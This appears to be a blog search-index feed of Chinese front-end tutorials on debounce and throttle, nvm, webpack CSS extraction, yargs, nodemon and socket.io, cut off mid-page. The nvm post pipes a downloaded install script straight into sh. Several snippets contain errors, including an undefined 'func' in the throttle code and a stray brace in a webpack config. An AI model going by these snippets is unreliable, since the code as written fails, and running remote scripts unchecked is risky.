<blockquote>
<p>一键分享到微博、QQ空间、QQ好友、微信、腾讯微博、豆瓣、Facebook、Twitter、Linkedin、Google+、点点等社交网站。</p>
</blockquote>
<p>如果你受够了分享组件的烦恼，那么来试试这个对移动端有好的分享组件吧，界面优美，看起来很赞。</p>
<p><a href="http://overtrue.me/share.js/">demo</a></p>
<p><strong><a href="https://github.com/josdejong/mathjs">mathjs</a></strong></p>
<p>js自带的数学运算不能满足你的需求了，那试试这个，扩展了很多数学运算。</p>
<p>这里是<a href="http://mathjs.org/">官网</a>。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-9777fdb7c06afbdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>js防抖和节流</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/js%E9%98%B2%E6%8A%96%E5%92%8C%E8%8A%82%E6%B5%81/</url>
    <content><![CDATA[<p>防抖和节流是针对响应跟不上触发频率这类问题的两种解决方案。应用场景有很多，输入框持续输入，将输入内容远程校验、多次触发点击事件、onScroll等等。 处理不当或者放任不管就容易引起浏览器卡死。<br>针对快速连续触发和不可控的高频触发问题， 给出debounce 和 throttling了两种解决策略；</p>
<h2 id="防抖-debounce-—"><a href="#防抖-debounce-—" class="headerlink" title="防抖(debounce)—"></a>防抖(debounce)—</h2><p>策略是当事件被触发时，设定一个周期延迟执行动作，若期间又被触发，则重新设定周期，直到周期结束，执行动作。 这是debounce的基本思想，在后期又扩展了前缘debounce，即执行动作在前，然后设定周期，周期内有事件被触发，不执行动作，且周期重新设定。</p>
<p><code>延迟debounce</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e3337fe492ae59fc?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="延迟debounce"></p>
<p><code>前缘debounce</code></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-759614d16bd50daa?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="前缘debounce"></p>
<p>debounce的特点是当事件快速连续不断触发时，动作只会执行一次。 延迟debounce，是在周期结束时执行，前缘debounce，是在周期开始时执行。但当触发有间断，且间断大于我们设定的时间间隔时，动作就会有多次执行。</p>
<p><strong>效果：</strong>如果短时间内大量触发同一事件，只会执行一次函数。</p>
<p><strong>实现：</strong>既然前面都提到了计时，那实现的关键就在于setTimeout这个函数，由于还需要一个变量来保存计时，考虑维护全局纯净，可以借助闭包来实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">* fn [function] 需要防抖的函数</span><br><span class="line">* delay [number] 毫秒，防抖期限值</span><br><span class="line">*&#x2F;</span><br><span class="line">function debounce(fn,delay)&#123;</span><br><span class="line">    let timer &#x3D; null &#x2F;&#x2F;借助闭包</span><br><span class="line">    return function() &#123;</span><br><span class="line">        if(timer)&#123;</span><br><span class="line">            clearTimeout(timer) &#x2F;&#x2F;进入该分支语句，说明当前正在一个计时过程中，并且又触发了相同事件。所以要取消当前的计时，重新开始计时</span><br><span class="line">            timer &#x3D; setTimeout(fn,delay) </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            timer &#x3D; setTimeout(fn,delay) &#x2F;&#x2F; 进入该分支说明当前并没有在计时，那么就开始一个计时</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>稍微简化下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*****************************简化后的分割线 ******************************&#x2F;</span><br><span class="line">function debounce(fn,delay)&#123;</span><br><span class="line">    let timer &#x3D; null &#x2F;&#x2F;借助闭包</span><br><span class="line">    return function() &#123;</span><br><span class="line">        if(timer)&#123;</span><br><span class="line">            clearTimeout(timer) </span><br><span class="line">        &#125;</span><br><span class="line">        timer &#x3D; setTimeout(fn,delay) &#x2F;&#x2F; 简化写法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 然后是旧代码</span><br><span class="line">function showTop  () &#123;</span><br><span class="line">    var scrollTop &#x3D; document.body.scrollTop || document.documentElement.scrollTop;</span><br><span class="line">　　console.log(&#39;滚动条位置：&#39; + scrollTop);</span><br><span class="line">&#125;</span><br><span class="line">window.onscroll &#x3D; debounce(showTop,1000) &#x2F;&#x2F; 为了方便观察效果我们取个大点的间断值，实际使用根据需要来配置</span><br><span class="line">&#96;&#96;&#96;&#96;</span><br><span class="line">此时会发现，必须在停止滚动1秒以后，才会打印出滚动条位置。</span><br><span class="line"></span><br><span class="line">## 节流(throttle)---</span><br><span class="line">策略是，让函数执行一次后，在某个时间段内暂时失效，过了这段时间后再重新激活（类似于技能冷却时间）。 节流策略也分前缘和延迟两种。与debounce类似，延迟是指 周期结束后执行动作，前缘是指执行动作后再开始周期。</span><br><span class="line"></span><br><span class="line">&#96;延迟throttling&#96;：</span><br><span class="line"></span><br><span class="line">![延迟throttling](https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;10024246-170a946907e707c2?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240)</span><br><span class="line"></span><br><span class="line">前缘throttling ：</span><br><span class="line"></span><br><span class="line">![前缘throttling ](https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;10024246-1f3724b815810fcf?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240)</span><br><span class="line"></span><br><span class="line">throttling的特点在连续高频触发事件时，动作会被定期执行，响应平滑。</span><br><span class="line">**效果：**如果短时间内大量触发同一事件，那么在函数执行一次之后，该函数在指定的时间期限内不再工作，直至过了这段时间才重新生效。</span><br><span class="line"></span><br><span class="line">**实现：** 这里借助setTimeout来做一个简单的实现，加上一个状态位valid来表示当前函数是否处于工作状态。</span><br></pre></td></tr></table></figure>
<p>function throttle(fn,delay){<br>    let run = true<br>    return function () {<br>      if (!run) {<br>        return  // 如果开关关闭了，那就直接不执行下边的代码<br>      }<br>      run = false // 持续触发的话，run一直是false，就会停在上边的判断那里<br>      setTimeout(() =&gt; {<br>        func.apply(this, arguments)<br>        run = true // 定时器到时间之后，会把开关打开，我们的函数就会被执行<br>      }, delay)<br>    }<br>}<br>/* 请注意，节流函数并不止上面这种实现方案,<br>   例如可以完全不借助setTimeout，可以把状态位换成时间戳，然后利用时间戳差值是否大于指定间隔时间来做判定。<br>   也可以直接将setTimeout的返回的标记当做判断条件-判断当前定时器是否存在，如果存在表示还在冷却，并且在执行fn之后消除定时器表示激活，原理都一样<br>    */<br>// 以下照旧<br>function showTop  () {<br>    var scrollTop = document.body.scrollTop || document.documentElement.scrollTop;<br>　　console.log(‘滚动条位置：’ + scrollTop);<br>}<br>window.onscroll = throttle(showTop,1000) </p>
<pre><code>## 总结
防抖和节流巧妙地用了setTimeout，来控制函数执行的时机，优点很明显，可以节约性能，不至于多次触发复杂的业务逻辑而造成页面卡顿。复杂情况可参考underscope.js的[throttle](https://underscorejs.net/#throttle)和[debounce](https://underscorejs.net/#debounce)
</code></pre>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>mac 使用nvm安装node</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/mac-%E4%BD%BF%E7%94%A8nvm%E5%AE%89%E8%A3%85node/</url>
    <content><![CDATA[<p>1.curl <a href="https://raw.github.com/creationix/nvm/master/install.sh">https://raw.github.com/creationix/nvm/master/install.sh</a> | sh</p>
<p>2.vi ~/.bash_profile<br>　　添加：source /Users/dujie/.nvm/nvm.sh</p>
<p>nvm install 0.10.24<br>nvm use 0.10.24</p>
<h1 id="默認使用-0-10-24-版本，否則每次關掉-Terminal-就得重新-nvm-use-一次"><a href="#默認使用-0-10-24-版本，否則每次關掉-Terminal-就得重新-nvm-use-一次" class="headerlink" title="默認使用 0.10.24 版本，否則每次關掉 Terminal 就得重新 nvm use 一次"></a>默認使用 0.10.24 版本，否則每次關掉 Terminal 就得重新 nvm use 一次</h1><p>$ nvm alias default 0.10.24</p>
<h1 id="列出所有安裝的版本"><a href="#列出所有安裝的版本" class="headerlink" title="列出所有安裝的版本"></a>列出所有安裝的版本</h1><p>$ nvm ls</p>
<h1 id="列出總共有哪些版本可以安裝"><a href="#列出總共有哪些版本可以安裝" class="headerlink" title="列出總共有哪些版本可以安裝"></a>列出總共有哪些版本可以安裝</h1><p>$ nvm ls-remote</p>
<p>安装常用的工具<br>npm install -g express<br>npm install -g bower<br>npm install -g fis</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>mini-css-extract-plugin简介</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/mini-css-extract-plugin%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>将css单独打包成一个文件的插件，它为每个包含css的js文件都创建一个css文件。它支持css和sourceMaps的按需加载。</p>
<p>目前只有在webpack V4版本才支持使用该插件</p>
<p>和extract-text-webpack-plugin相比：</p>
<ul>
<li>异步加载</li>
<li>无重复编译，性能有所提升</li>
<li>用法简单</li>
<li>支持css分割<br>例子：</li>
</ul>
<h5 id="支持HMR"><a href="#支持HMR" class="headerlink" title="支持HMR"></a>支持HMR</h5><ul>
<li>Install *<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save-dev mini-css-extract-plugin</span><br></pre></td></tr></table></figure>
<h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5></li>
</ul>
<ul>
<li>简单的例子<br>webpack.config.js<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const MiniCssExtractPlugin &#x3D; require(&quot;mini-css-extract-plugin&quot;);</span><br><span class="line"></span><br><span class="line">module.exports&#x3D;&#123;</span><br><span class="line">    plugins:[</span><br><span class="line">        new MiniCssExtractPlugin(&#123;</span><br><span class="line">        &#x2F;&#x2F; Options similar to the same options in webpackOptions.output</span><br><span class="line">        &#x2F;&#x2F; both options are optional</span><br><span class="line">        filename: &quot;[name].css&quot;,</span><br><span class="line">        chunkFilename: &quot;[id].css&quot;</span><br><span class="line">        &#125;)</span><br><span class="line">    ],</span><br><span class="line">     module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.css$&#x2F;,</span><br><span class="line">        use: [</span><br><span class="line">          &#123;</span><br><span class="line">            loader: MiniCssExtractPlugin.loader,</span><br><span class="line">            options: &#123;</span><br><span class="line">              &#x2F;&#x2F; you can specify a publicPath here</span><br><span class="line">              &#x2F;&#x2F; by default it use publicPath in webpackOptions.output</span><br><span class="line">              publicPath: &#39;..&#x2F;&#39;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;css-loader&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>高级的配置</li>
</ul>
<p>这个插件应该只在生产环境构建中使用，并且在loader链中不应该有style-loader，特别是我们在开发模式中使用HMR时。</p>
<p>下面是一个在开发模式中使用HMR并在生产环境构建的文件中提出出css样式的示例。</p>
<p>(各个loader的配置根据你的需求进行自定义修改)</p>
<p>webpack.config.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const MiniCssExtractPlugin &#x3D; require(&quot;mini-css-extract-plugin&quot;);</span><br><span class="line">const devMode &#x3D; process.env.NODE_ENV !&#x3D;&#x3D; &#39;production&#39;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    new MiniCssExtractPlugin(&#123;</span><br><span class="line">      &#x2F;&#x2F; Options similar to the same options in webpackOptions.output</span><br><span class="line">      &#x2F;&#x2F; both options are optional</span><br><span class="line">      filename: devMode ? &#39;[name].css&#39; : &#39;[name].[hash].css&#39;,</span><br><span class="line">      chunkFilename: devMode ? &#39;[id].css&#39; : &#39;[id].[hash].css&#39;,</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.(sa|sc|c)ss$&#x2F;,</span><br><span class="line">        use: [</span><br><span class="line">          devMode ? &#39;style-loader&#39; : MiniCssExtractPlugin.loader,</span><br><span class="line">          &#39;css-loader&#39;,</span><br><span class="line">          &#39;postcss-loader&#39;,</span><br><span class="line">          &#39;sass-loader&#39;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生产环境最小化<br>等到webpack V5时，有可能会将css压缩功能进行集成，但是在webpack V4，我们还需要手动使用optimize-css-assets-webpack-plugin来进行css的压缩。配置wepack的optimization.minimizer选项来覆盖webpack的默认配置。同时也要指定一个js压缩器。</p>
<p>wepack.config.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const UglifyJsPlugin &#x3D; require(&quot;uglifyjs-webpack-plugin&quot;);</span><br><span class="line">const MiniCssExtractPlugin &#x3D; require(&quot;mini-css-extract-plugin&quot;);</span><br><span class="line">const OptimizeCSSAssetsPlugin &#x3D; require(&quot;optimize-css-assets-webpack-plugin&quot;);</span><br><span class="line"></span><br><span class="line">module.exports&#x3D;&#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimizer: [</span><br><span class="line">      new UglifyJsPlugin(&#123;</span><br><span class="line">        cache: true,</span><br><span class="line">        parallel: true,</span><br><span class="line">        sourceMap: true &#x2F;&#x2F; set to true if you want JS source maps</span><br><span class="line">      &#125;),</span><br><span class="line">      new OptimizeCSSAssetsPlugin(&#123;&#125;)</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    new MiniCssExtractPlugin(&#123;</span><br><span class="line">      filename: &quot;[name].css&quot;,</span><br><span class="line">      chunkFilename: &quot;[id].css&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.css$&#x2F;,</span><br><span class="line">        use: [</span><br><span class="line">          MiniCssExtractPlugin.loader,</span><br><span class="line">          &quot;css-loader&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其他功能</li>
</ul>
<p>使用预加载或内联CSS<br>运行时代码通过link 或 style标签检测已经添加的css,当在服务端注入css为了在服务端进行渲染时是非常有用的。link标签的href属性用来匹配被加载的css块的URL，data-href属性也可以在link和style标签上使用，当使用内联样式的时候必须使用href.</p>
<p>提取所有的css到一个文件中<br>类似于 extract-text-webpack-plugin的作用，可以使用optimization.splitChunks.cacheGroups来将css提取到一个文件中</p>
<p>webpack.config.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const MiniCssExtractPlugin &#x3D; require(&quot;mini-css-extract-plugin&quot;);</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    splitChunks: &#123;</span><br><span class="line">      cacheGroups: &#123;</span><br><span class="line">        styles: &#123;</span><br><span class="line">          name: &#39;styles&#39;,</span><br><span class="line">          test: &#x2F;\.css$&#x2F;,</span><br><span class="line">          chunks: &#39;all&#39;,</span><br><span class="line">          enforce: true</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    new MiniCssExtractPlugin(&#123;</span><br><span class="line">      filename: &quot;[name].css&quot;,</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.css$&#x2F;,</span><br><span class="line">        use: [</span><br><span class="line">          MiniCssExtractPlugin.loader,</span><br><span class="line">          &quot;css-loader&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>根据webpack 的 entry 提取 css</li>
</ul>
<p>还可以根据webpack entry提取CSS。如果动态导入路由，但希望根据条目将CSS绑定在一起，那么这一点尤其有用。这也防止了使用ExtractTextPlugin时出现的CSS复制问题。</p>
<p>webpack.config.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const path &#x3D; require(&#39;path&#39;);</span><br><span class="line">const MiniCssExtractPlugin &#x3D; require(&quot;mini-css-extract-plugin&quot;);</span><br><span class="line"></span><br><span class="line">function recursiveIssuer(m) &#123;</span><br><span class="line">  if (m.issuer) &#123;</span><br><span class="line">    return recursiveIssuer(m.issuer);</span><br><span class="line">  &#125; else if (m.name) &#123;</span><br><span class="line">    return m.name;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  entry: &#123;</span><br><span class="line">    foo: path.resolve(__dirname, &#39;src&#x2F;foo&#39;),</span><br><span class="line">    bar: path.resolve(__dirname, &#39;src&#x2F;bar&#39;)</span><br><span class="line">  &#125;,  </span><br><span class="line">  plugins: [</span><br><span class="line">    new MiniCssExtractPlugin(&#123;</span><br><span class="line">      filename: &quot;[name].css&quot;,</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: &#x2F;\.css$&#x2F;,</span><br><span class="line">        use: [</span><br><span class="line">          MiniCssExtractPlugin.loader,</span><br><span class="line">          &quot;css-loader&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  optimization:&#123;</span><br><span class="line">    splitChunks:&#123;</span><br><span class="line">      cacheGroups:&#123;</span><br><span class="line">          fooStyles:&#123;</span><br><span class="line">            fooStyles: &#123;</span><br><span class="line">            name: &#39;foo&#39;,</span><br><span class="line">            test: (m,c,entry &#x3D; &#39;foo&#39;) &#x3D;&gt; m.constructor.name &#x3D;&#x3D;&#x3D; &#39;CssModule&#39; &amp;&amp; recursiveIssuer(m) &#x3D;&#x3D;&#x3D; entry,</span><br><span class="line">            chunks: &#39;all&#39;,</span><br><span class="line">            enforce: true</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>node.js中使用yargs来处理命令行参数</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/node-js%E4%B8%AD%E4%BD%BF%E7%94%A8yargs%E6%9D%A5%E5%A4%84%E7%90%86%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<p>yargs库能够方便的处理命令行参数。</p>
<p>一、安装 yargs</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install yargs --save</span><br></pre></td></tr></table></figure>

<p>二、读取命令行参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const yargs &#x3D; require(&#39;yargs&#39;);</span><br><span class="line"> </span><br><span class="line">let argv &#x3D; yargs.argv;</span><br><span class="line">console.log(argv);</span><br></pre></td></tr></table></figure>
<p>argv 对象用来保存命令行参数，传递参数时，参数名以 – 开头，中间使用 = 或 空格，然后接上值 。</p>
<p>argv 有一个 下划线 属性，该属性用来获取非连词线开头的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const yargs &#x3D; require(&#39;yargs&#39;);</span><br><span class="line"> </span><br><span class="line">let argv &#x3D; yargs.argv;</span><br><span class="line">console.log(argv._);</span><br></pre></td></tr></table></figure>
<p>还可以给参数名取一个别名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const yargs &#x3D; require(&#39;yargs&#39;);</span><br><span class="line"> </span><br><span class="line">let argv &#x3D; yargs</span><br><span class="line">    .alias(&#39;n&#39;, &#39;name&#39;)</span><br><span class="line">    .alias(&#39;s&#39;, &#39;save&#39;)</span><br><span class="line">    .alias(&#39;w&#39;, &#39;width&#39;)</span><br><span class="line">    .argv;</span><br><span class="line"> </span><br><span class="line">console.log(argv);</span><br></pre></td></tr></table></figure>
<p>.demandOption(key, msg) 是否必须填写<br>.default(key, value, [description]) 设置默认值<br>.describe(key, desc) 命令描述信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const yargs &#x3D; require(&#39;yargs&#39;);</span><br><span class="line"> </span><br><span class="line">let argv &#x3D; yargs</span><br><span class="line">    .alias(&#39;s&#39;, &#39;src&#39;)</span><br><span class="line">    .alias(&#39;d&#39;, &#39;dst&#39;)</span><br><span class="line">    .demandOption([&#39;s&#39;, &#39;d&#39;], &#39;s 与 d 必须填写&#39;)</span><br><span class="line">    .default(&#39;s&#39;, &#39;a.txt&#39;)</span><br><span class="line">    .default(&#39;d&#39;, &#39;b.txt&#39;)</span><br><span class="line">    .describe(&#39;s&#39;, &#39;源文件&#39;)</span><br><span class="line">    .describe(&#39;d&#39;, &#39;目标文件&#39;)</span><br><span class="line">    .argv;</span><br><span class="line"> </span><br><span class="line">console.log(argv);</span><br></pre></td></tr></table></figure>
<p>我们可以通过 .option(key, [opt]) 配置所有设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const yargs &#x3D; require(&#39;yargs&#39;);</span><br><span class="line"> </span><br><span class="line">let argv &#x3D; yargs</span><br><span class="line">    .option(&#39;s&#39;, &#123;</span><br><span class="line">        alias: &#39;src&#39;,</span><br><span class="line">        demandOption: true,</span><br><span class="line">        default: &#39;a.txt&#39;,</span><br><span class="line">        describe: &#39;源文件&#39;,</span><br><span class="line">        type: &#39;string&#39;</span><br><span class="line">    &#125;)</span><br><span class="line">    .option(&#39;d&#39;, &#123;</span><br><span class="line">        alias: &#39;dst&#39;,</span><br><span class="line">        demandOption: true,</span><br><span class="line">        default: &#39;b.txt&#39;,</span><br><span class="line">        describe: &#39;目标文件&#39;,</span><br><span class="line">        type: &#39;string&#39;</span><br><span class="line">    &#125;)</span><br><span class="line">    .argv;</span><br><span class="line"> </span><br><span class="line">console.log(argv);</span><br></pre></td></tr></table></figure>
<p>有些时候我们只想知道某些参数有没有设置，是 true 或是 false。<br>通过 .boolean(key) 解析参数为布尔值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const yargs &#x3D; require(&#39;yargs&#39;);</span><br><span class="line"> </span><br><span class="line">let argv &#x3D; yargs</span><br><span class="line">    .alias(&#39;s&#39;, &#39;save&#39;)</span><br><span class="line">    .boolean([&#39;s&#39;])</span><br><span class="line">    .argv;</span><br><span class="line"> </span><br><span class="line">console.log(argv);</span><br></pre></td></tr></table></figure>
<p>.usage() 用法格式<br>.example(cmd, desc) 提供例子<br>.help() 帮助信息<br>.epilog(str) 在帮助信息尾部显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const yargs &#x3D; require(&#39;yargs&#39;);</span><br><span class="line"> </span><br><span class="line">let argv &#x3D; yargs</span><br><span class="line">    .alias(&#39;s&#39;, &#39;save&#39;)</span><br><span class="line">    .usage(&#39;Usage: --s &lt;filename&gt;&#39;)</span><br><span class="line">    .example(&#39;--s a.txt&#39;, &#39;设置源文件&#39;)</span><br><span class="line">    .epilog(&#39;copyright&#39;)</span><br><span class="line">    .help(&#39;info&#39;)</span><br><span class="line">    .argv;</span><br><span class="line"> </span><br><span class="line">console.log(argv);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>node之nodemon的简单配置和使用</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/node%E4%B9%8Bnodemon%E7%9A%84%E7%AE%80%E5%8D%95%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>nodemon是一种工具，通过在检测到目录中的文件更改时自动重新启动节点应用程序来帮助开发基于node.js的应用程序。</p>
<p>nodemon并没有要求任何对你的代码或开发的方法中的额外变化。nodemon是一个替换包装器node，用于在执行脚本时nodemon替换node命令行上。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g nodemon</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>nodemon将全局安装到您的系统路径。</p>
<p>您还可以将nodemon安装为开发依赖项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save-dev nodemon</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nodemon app.js</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用帮助</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nodemon -h</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果我的应用程序接受主机和端口作为参数，我会这样开始：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nodemon .&#x2F;server.js localhost 8080</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果想更多的学习，就去github上仔细看一下<br><a href="https://github.com/remy/nodemon">https://github.com/remy/nodemon</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>node服务端解决socket.io跨域问题express,koa</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/node%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%A7%A3%E5%86%B3socket-io%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98express,koa/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>我们今天主要记录下 <code>socket.io</code>跨域的问题</p>
<p>我们服务端采用 <code>node</code>分别使用 <code>express</code>,<code>koa</code> 搭建</p>
<p>首先我们下载 <code>socket.io</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm i socket.io</span><br></pre></td></tr></table></figure>
<p>首先是 <code>express</code> 搭建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 导入express </span><br><span class="line">const express &#x3D; require(&quot;express&quot;)</span><br><span class="line">const app &#x3D; express()</span><br><span class="line">&#x2F;&#x2F; 开启socket服务</span><br><span class="line">let server &#x3D; app.listen(12345)</span><br><span class="line">&#x2F;&#x2F; socket 初始化</span><br><span class="line">const io &#x3D; require(&quot;socket.io&quot;)(server)</span><br><span class="line">&#x2F;&#x2F; 监听</span><br><span class="line">io.on(&quot;connection&quot;, (socket) &#x3D;&gt; &#123;   </span><br><span class="line">      console.log(&quot;有人链接&quot;)&#125;)</span><br><span class="line">      app.listen(3322, () &#x3D;&gt; &#123;    </span><br><span class="line">            console.log(&quot;服务开启成功。。。。&quot;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>然后我们使用 <code>koa</code> 搭建一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 引入依赖</span><br><span class="line">const koa &#x3D; require(&quot;koa&quot;);</span><br><span class="line">&#x2F;&#x2F; 初始化koa</span><br><span class="line">const app &#x3D; new koa();</span><br><span class="line">&#x2F;&#x2F; 开启 http </span><br><span class="line">var server &#x3D; require(&quot;http&quot;).createServer(app.callback());</span><br><span class="line">&#x2F;&#x2F; 初始化 socket</span><br><span class="line">const io &#x3D; require(&quot;socket.io&quot;)(server);</span><br><span class="line">&#x2F;&#x2F; 监听</span><br><span class="line">io.on(&quot;connection&quot;, (socket) &#x3D;&gt; &#123;</span><br><span class="line">    console.log(&quot;有人链接&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(3000);</span><br></pre></td></tr></table></figure>
<p>然后服务端我们就搭建好了</p>
<p>我们来搭建客户端页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">        &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">        &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;socket.io&#x2F;3.0.3&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;&lt;&#x2F;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    		&#x2F;&#x2F; 链接服务</span><br><span class="line">        let socket &#x3D; io(&#39;ws:&#x2F;&#x2F;localhost:5522&#39;);</span><br><span class="line">        &#x2F;&#x2F; 